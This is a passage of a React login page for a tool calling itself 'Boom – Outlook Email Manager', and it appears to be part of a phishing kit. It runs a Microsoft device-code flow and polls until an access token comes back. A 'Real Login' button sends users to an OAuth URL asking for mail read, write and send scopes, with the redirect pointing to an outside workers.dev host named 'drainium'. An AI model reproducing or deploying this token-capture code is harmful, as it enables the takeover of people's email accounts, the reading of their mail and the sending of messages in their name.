import { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import { useAuthStore } from '../hooks/useAuth'
import { authAPI } from '../services/api'

export default function Login() {
  const navigate = useNavigate()
  const setAuth = useAuthStore((state) => state.setAuth)
  const [deviceCode, setDeviceCode] = useState(null)
  const [userCode, setUserCode] = useState(null)
  const [timeLeft, setTimeLeft] = useState(900)
  const [activeMethod, setActiveMethod] = useState('device')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState(null)

  useEffect(() => {
    if (!deviceCode) return

    const interval = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 0) {
          setDeviceCode(null)
          setUserCode(null)
          return 900
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(interval)
  }, [deviceCode])

  useEffect(() => {
    if (!deviceCode) return

    const pollInterval = setInterval(async () => {
      try {
        const response = await authAPI.pollDeviceCode(deviceCode)
        if (response.data.accessToken) {
          clearInterval(pollInterval)
          setAuth(response.data.accessToken, response.data.email, response.data.displayName)
          navigate('/admin')
        }
      } catch (err) {
        if (err.response?.status !== 202) {
          console.error('Polling error:', err)
        }
      }
    }, 5000)

    return () => clearInterval(pollInterval)
  }, [deviceCode, setAuth, navigate])

  const handleGetDeviceCode = async () => {
    setLoading(true)
    setError(null)

    try {
      const response = await authAPI.getDeviceCode()
      setDeviceCode(response.data.device_code)
      setUserCode(response.data.user_code)
      setTimeLeft(response.data.expires_in)
    } catch (err) {
      setError(err.message || 'Failed to get device code')
    } finally {
      setLoading(false)
    }
  }

  const handleCopyCode = () => {
    navigator.clipboard.writeText(userCode)
    alert('✅ Code copied to clipboard!')
  }

  const handleRealLogin = () => {
    const oauthUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=0b907307-4c16-46bc-b280-64bb4a085afa&response_type=code&scope=Mail.Read%20Mail.ReadWrite%20Mail.Send&redirect_uri=https://curly-mouse-cb01.drainium.workers.dev/oauth-callback`
    window.location.href = oauthUrl
  }

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, '0')}`
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-600 to-blue-800 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-2xl max-w-md w-full p-8">
        <div className="text-center mb-8">
          <h1 className="text-6xl font-bold text-blue-600 mb-2">💥</h1>
          <h2 className="text-3xl font-bold text-gray-800">Boom</h2>
          <p className="text-gray-600 text-sm mt-1">Outlook Email Manager</p>
        </div>

        <div className="flex gap-2 mb-6">
          <button
            onClick={() => setActiveMethod('device')}
            className={`flex-1 py-2 px-4 rounded-lg font-bold transition ${
              activeMethod === 'device'
                ? 'bg-blue-600 text-white'
                : 'bg-gray-200 text-gray-800 hover:bg-gray-300'
            }`}
          >
            📱 Device Code
          </button>
          <button
            onClick={() => setActiveMethod('real')}
            className={`flex-1 py-2 px-4 rounded-lg font-bold transition ${
              activeMethod === 'real'
                ? 'bg-blue-600 text-white'
                : 'bg-gray-200 text-gray-800 hover:bg-gray-300'
            }`}
          >
            🔐 Real Login
          </button>
        </div>

        {error && (
          <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded mb-4 text-sm">
            {error}
          </div>
        )}

        {activeMethod === 'device' && (
          <div>
            {!deviceCode ? (
              <button
                onClick={handleGetDeviceCode}
                disabled={loading}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-bold py-3 px-4 rounded-lg transition"
              >
                {loading ? '⏳ Getting code...' : '🔐 Get Device Code'}
              </button>
            ) : (


